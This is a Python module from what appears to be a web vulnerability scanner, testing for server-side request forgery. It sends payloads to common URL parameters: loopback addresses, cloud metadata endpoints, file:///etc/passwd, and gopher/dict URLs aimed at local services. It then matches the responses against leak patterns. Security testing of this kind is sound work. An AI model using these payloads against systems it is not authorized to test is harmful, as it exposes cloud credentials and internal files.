from modules.base import BaseModule
from modules.evidence import context_excerpt, new_regex_evidence


class SsrfModule(BaseModule):
    NAME = "ssrf"
    DESCRIPTION = "SSRF testing - internal service probing, cloud metadata"

    PAYLOADS = [
        "http://127.0.0.1/",
        "http://localhost/",
        "http://[::1]/",
        "http://0.0.0.0/",
        "http://169.254.169.254/latest/meta-data/",    # AWS
        "http://metadata.google.internal/computeMetadata/v1/",  # GCP
        "http://169.254.169.254/metadata/v1/",         # DigitalOcean
        "http://169.254.169.254/metadata/instance",    # Azure
        "file:///etc/passwd",
        "dict://127.0.0.1:22/",
        "ftp://127.0.0.1:21/",
        "gopher://127.0.0.1:6379/_INFO",
        "http://127.1/",
        "http://0177.0.0.1/",
        "http://0x7f000001/",
    ]

    SSRF_EVIDENCE_PATTERNS = [
        r"(?m)^ami-id\s*$", r"(?m)^instance-id\s*$",
        r"(?m)^local-ipv4\s*$", r"(?m)^hostname\s*$",
        r'"instanceId"\s*:', r'"subscriptionId"\s*:',
        r'"availabilityZone"\s*:', r"Metadata-Flavor\s*:\s*Google",
        r"(?m)^root:[^\r\n]*:0:0:[^\r\n]*$",
    ]

    PARAMS = ["url", "file", "page", "source", "dest", "redirect",
              "return", "path", "continue", "img", "link", "href",
              "fetch", "load", "proxy", "target", "to", "from"]

    def run(self):
        self.log.info("[ssrf] Testing for SSRF vulnerabilities")
        for param in self.PARAMS:
            baseline = self.get(
                self.target,
                params={param: "https://vulxor.invalid/ssrf-baseline"},
            )
            if not baseline:
                continue
            for payload in self.PAYLOADS:
                resp = self.get(self.target, params={param: payload})
                evidence = self._ssrf_evidence(baseline, resp, payload)
                if evidence:
                    self.add_finding(
                        severity="CRITICAL",
                        title="Server-Side Request Forgery (SSRF)",
                        url=self.target,
                        detail=f"Parameter '{param}' fetched internal resource.",
                        payload=payload,
                        evidence=context_excerpt(resp.text, evidence),
                        remediation=(
                            "Allowlist permitted schemes and destinations. "
                            "Block requests to private IP ranges."
                        ),
                    )
                    return

    def _ssrf_evidence(self, baseline, resp, payload: str):
        if not resp or resp.status_code not in (200, 301, 302):
            return None
        evidence = new_regex_evidence(
            baseline.text if baseline else "",
            resp.text,
            self.SSRF_EVIDENCE_PATTERNS,
        )
        if evidence and evidence.casefold() not in payload.casefold():
            return evidence
        return None
